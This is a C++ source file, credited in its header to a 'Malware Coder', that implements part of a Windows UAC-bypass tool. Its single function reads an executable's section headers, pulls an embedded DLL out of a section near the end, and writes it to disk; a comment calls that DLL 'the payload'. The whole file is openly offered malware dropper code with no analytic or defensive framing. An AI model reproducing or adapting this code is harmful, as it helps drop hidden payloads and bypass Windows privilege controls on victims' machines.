/*
##################################################
#                                                #
#         Malware Coder: Elliot Alderson         #
#                                                #
#   Github: https://github.com/ElliotAlderson51  #
#                                                #
##################################################
*/

#include "UAC.h"

// Extract DLL file from the last section
bool BypassUAC::ExtractFileFromSection(PBYTE module_base, const std::string& save_path, const std::string& save_name, const int index_from_the_end)
{
	DWORD module_size = NULL;
	PIMAGE_DOS_HEADER image_dos_header = (PIMAGE_DOS_HEADER)(module_base);
	if (image_dos_header->e_magic == IMAGE_DOS_SIGNATURE)
	{
		PIMAGE_NT_HEADERS image_nt_headers = (PIMAGE_NT_HEADERS)(module_base + image_dos_header->e_lfanew);
		if (image_nt_headers->Signature == IMAGE_NT_SIGNATURE)
		{
			PIMAGE_SECTION_HEADER first_section = (PIMAGE_SECTION_HEADER)(IMAGE_FIRST_SECTION(image_nt_headers)); // First Section
			PIMAGE_SECTION_HEADER dll_section = (PIMAGE_SECTION_HEADER)(first_section + image_nt_headers->FileHeader.NumberOfSections - index_from_the_end); // Last Section

			if (dll_section != ERROR)
			{
				module_size = dll_section->Misc.VirtualSize;
				PBYTE dll_memory = RtlOffsetToPointer(module_base, dll_section->VirtualAddress);

				// move the payload onto save_path
				DWORD bytes_written = NULL;

				if (dirExists(save_path))
				{
					HANDLE new_file = CreateFileA((save_path + "\\" + save_name).c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
					if (new_file != INVALID_HANDLE_VALUE)
					{
						WriteFile(new_file, dll_memory, module_size, &bytes_written, NULL);
					}
					CloseHandle(new_file);
				}
				// LocalFree(dll_memory);
				return true;
			}
		}
	}
	return false;
}